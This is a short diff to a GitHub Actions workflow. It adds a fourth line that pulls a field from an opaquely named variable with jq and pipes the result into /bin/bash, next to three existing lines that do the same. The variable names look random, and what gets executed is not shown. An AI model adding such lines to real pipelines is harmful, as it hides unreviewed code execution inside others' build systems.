@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$ifmz7" | jq -r .j8 | /bin/bash
           echo $zd2560 | jq -r .u470 | /bin/bash
           printf '%s' "$w5" | jq -r .w12637 | /bin/bash
+          printf '%s' "$dvboh31" | jq -r .z5503 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
